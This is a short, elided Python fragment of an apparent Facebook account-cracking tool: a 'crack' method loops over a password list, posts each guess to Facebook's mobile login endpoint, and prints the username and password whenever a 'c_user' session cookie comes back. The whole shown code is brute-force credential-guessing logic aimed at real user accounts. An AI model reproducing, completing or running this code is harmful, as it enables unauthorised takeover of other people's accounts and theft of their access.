...
class crack:
	...
	def crack(self,user,lala,asu):
		...
		for pw in lala:
			...
			d=ses.post("https://mtouch.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)
			if 'c_user' in d.cookies.get_dict().keys():
				...
				print(f'\r\33[1;33m* --> [CP] {user}|{pw}{ttl}\33[37;1m              \n',end='')
				break
